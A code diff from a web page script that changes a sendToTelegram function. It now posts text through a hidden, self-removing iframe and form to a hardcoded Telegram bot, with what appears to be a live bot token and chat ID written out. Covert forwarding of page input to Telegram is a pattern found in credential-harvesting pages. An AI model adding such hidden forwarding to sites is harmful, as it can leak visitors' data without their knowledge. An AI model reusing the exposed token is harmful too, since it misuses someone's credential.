@@ -2496,18 +2496,25 @@
   function sendToTelegram(text) {
     var token = '8656212937:AAEg4hW9G3wNVfTcYF5dpLYH9s_gTKpKhDg';
     var chatId = '1024694488';
-    var url = 'https://api.telegram.org/bot' + token + '/sendMessage';
-    var params = new URLSearchParams();
-    params.append('chat_id', chatId);
-    params.append('text', text);
-    fetch(url, {
-      method: 'POST',
-      mode: 'no-cors',
-      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-      body: params.toString()
-    }).catch(function(err) {
-      console.error('Telegram send error:', err);
-    });
+    var iframe = document.createElement('iframe');
+    iframe.name = 'tg_frame';
+    iframe.style.display = 'none';
+    var form = document.createElement('form');
+    form.method = 'POST';
+    form.action = 'https://api.telegram.org/bot' + token + '/sendMessage';
+    form.target = 'tg_frame';
+    form.style.display = 'none';
+    var f1 = document.createElement('input');
+    f1.name = 'chat_id'; f1.value = chatId; form.appendChild(f1);
+    var f2 = document.createElement('input');
+    f2.name = 'text'; f2.value = text; form.appendChild(f2);
+    document.body.appendChild(iframe);
+    document.body.appendChild(form);
+    form.submit();
+    setTimeout(function() {
+      document.body.removeChild(form);
+      document.body.removeChild(iframe);
+    }, 3000);
   }
 
   function resetForm() {
